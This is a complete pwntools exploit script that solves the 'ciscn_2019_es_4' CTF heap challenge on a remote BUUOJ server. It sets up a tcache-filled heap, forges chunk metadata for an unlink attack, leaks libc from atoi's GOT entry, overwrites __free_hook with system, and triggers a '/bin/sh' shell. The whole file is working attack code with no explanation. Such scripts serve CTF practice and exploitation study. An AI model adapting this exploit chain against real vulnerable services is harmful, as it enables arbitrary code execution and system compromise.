from os import system
from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ciscn_2019_es_4')
io = remote('node4.buuoj.cn', 29991)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
elf = ELF('ciscn_2019_es_4')
heap_list = elf.sym['heap']
len_list = elf.sym['len']
atoi_got = elf.got['atoi']


def add(index, size, content):
    io.sendlineafter('4.show\n', '1')
    io.sendlineafter('index:\n', str(index))
    io.sendlineafter('size:\n', str(size))
    io.recvuntil('gift: ')
    addr = int(io.recvline()[:-1], 16)
    io.sendafter('content:\n', content)
    return addr


def delete(index):
    io.sendlineafter('4.show\n', '2')
    io.sendlineafter('index:\n', str(index))


def edit(index, content):
    io.sendlineafter('4.show\n', '3')
    io.sendlineafter('index:\n', str(index))
    io.sendafter('content:\n', content)


def show(index):
    io.sendlineafter('4.show\n', '4')
    io.sendlineafter('index:\n', str(index))
    return io.recvline()[:-1]


def unlink():
    global heap_base
    heap_base = add(0, 0xf8, 'aaaa') - 0x260
    log.success('heap_base: ' + hex(heap_base))
    for i in range(1, 8):
        add(i, 0xf8, 'aaaa')
    add(32, 0xf8, 'aaaa')
    add(8, 0xf8, 'aaaa')
    for i in range(1, 8):
        delete(i)
    fd, bk = heap_list + 0x100 - 0x18, heap_list + 0x100 - 0x10
    payload = p64(0) + p64(0xf1) + p64(fd) + p64(bk) + cyclic(0xd0) + p64(0xf0)
    edit(32, payload)
    delete(8)


def pwn():
    global libc_base
    payload = p64(0) * 2 + p64(atoi_got) + p64(len_list)
    payload += b'\x00' * 0xd0
    #          key2     key1
    payload += p32(1) + p32(3)
    edit(32, payload)
    libc_base = u64(show(31).ljust(8, b'\x00')) - libc.sym['atoi']
    log.success('libc_base: ' + hex(libc_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    payload = p32(0x100) * 32 + p64(__free_hook - 8)
    edit(32, payload)
    edit(0, b'/bin/sh\x00' + p64(system))
    delete(0)
    io.interactive()
    # gdb.attach(io)
    # pause()

    

if __name__ == '__main__':
    unlink()
    pwn()
